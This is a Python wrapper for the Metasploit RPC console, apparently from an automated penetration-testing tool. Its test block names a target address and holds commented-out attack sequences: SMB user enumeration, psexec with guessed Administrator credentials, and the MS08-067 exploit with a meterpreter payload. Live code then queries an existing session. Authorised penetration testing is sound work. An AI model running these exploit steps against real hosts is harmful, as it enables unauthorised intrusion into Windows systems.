#!/usr/bin/env python3
import time
from threading import Lock

import core.msfrpc2 as msfrpc


class MyMsf:
    lock = Lock()

    def __init__(self, host="127.0.0.1", port: int | str = "55552", user="msf", password="msf", uri="/api/", ssl=False,
                 create_workspace: bool = True):
        self.host = host
        self.port: str = str(port)
        self.user = user
        self.password = password
        self.uri = uri
        self.ssl = ssl
        self.workspace = ""
        self.id = None
        self.authenticated = False
        self.conn = None

        self._connect(host=self.host, port=self.port, uri=self.uri, ssl=self.ssl)
        self._login(user=self.user, password=self.password)
        self._init_connection(create_workspace)

    def _connect(self, host="127.0.0.1", port="55552", uri="/api/", ssl=False):
        self.conn = msfrpc.Msfrpc({'host': host, 'port': port, 'uri': uri, 'ssl': ssl})

    def _login(self, user="msf", password="msf"):
        self.authenticated = False
        try:
            res = self.conn.login(user=user, password=password)
            self.authenticated = True
        except Exception as e:
            print(e)

    def _init_connection(self, create_workspace=True):
        if not self.authenticated:
            return ""

        self.execute("set THREADS 10\n")

        if create_workspace:
            self.create_workspace("autopentest")
            self.execute("workspace autopentest\n")

        self.get_result()

    def _get_console_id(self):
        if not self.authenticated:
            return ""

        if not self.id:
            console = self.conn.call('console.create', opts=[])
            if 'id' in console:
                self.id = console['id']
            else:
                print("FAILED!!!")
        return self.id

    def is_authenticated(self):
        return self.authenticated

    def create_workspace(self, workspace):
        if not self.authenticated:
            return ""

        if not self.id:
            self._get_console_id()

        self.workspace = workspace

        result = self.conn.call('console.write', [self.id, "workspace -a %s\n" % self.workspace])
        self.conn.call('console.write', [self.id, "workspace %s\n" % self.workspace])
        self.sleep(1)

        return result

    def execute(self, cmd):
        if not self.authenticated:
            return ""

        if not self.id:
            self._get_console_id()

        result = ""
        if self.id:
            result = self.conn.call('console.write', [self.id, cmd])
            self.sleep(2)

        return result

    def sleep(self, sec):
        if not self.authenticated:
            return ""

        time.sleep(sec)
        return

    def get_result(self):
        if not self.authenticated:
            return ""

        result = ""
        if self.id:
            while True:
                if res := self.conn.call('console.read', [self.id]):
                    if 'data' in res and len(res['data']) > 1:
                        result += res['data']

                    if 'busy' in res and res['busy'] is True:
                        self.sleep(1)
                        continue

                break
        return result

    def cleanup(self):
        if not self.authenticated:
            return ""

        result = self.conn.call('console.destroy', [self.id]) if self.id else ''
        self.id = None
        return result


# -----------------------------------------------------------------------------
# main test code
# -----------------------------------------------------------------------------
if __name__ == "__main__":
    target = "192.168.1.136"

    # connect to msfrpc
    msf = MyMsf(host="127.0.0.1", port=55552, user="msf", password="mypass")

    # msf.execute("use auxiliary/scanner/smb/smb_enumusers\n")
    # msf.execute("set RHOSTS %s\n" % target)
    # msf.execute("run\n")

    #    msf.execute("use exploit/windows/smb/psexec\n")
    #    msf.execute("set RHOST %s\n" % target)
    #    msf.execute("set SMBuser Administrator\n")
    #    msf.execute("set SMBpass password\n")
    #    msf.execute("exploit -z\n")

    #    msf.execute("use exploit/windows/smb/ms08_067_netapi\n")
    #    msf.execute("set TARGET 0\n")
    #    msf.execute("set PAYLOAD windows/meterpreter/bind_tcp\n")
    #    msf.execute("set LHOST 192.168.1.238\n")
    #    msf.execute("set LPORT 11096\n")
    #    msf.execute("set RPORT 445\n")
    #    msf.execute("set RHOST 192.168.1.136\n")
    #    msf.execute("set SMBPIPE BROWSER\n")
    #    msf.execute("exploit -j\n")

    #    msf.sleep(5)
    #    print msf.get_result()

    msf.execute("sessions -i\n")
    msf.sleep(1)
    print(msf.get_result())

    msf.execute("sessions -i 2\n")
    msf.execute("getuid\n")
    msf.execute("sysinfo\n")
    msf.execute("background\n")
    print(msf.get_result())

    msf.execute("sessions -i\n")
    msf.sleep(1)
    print(msf.get_result())
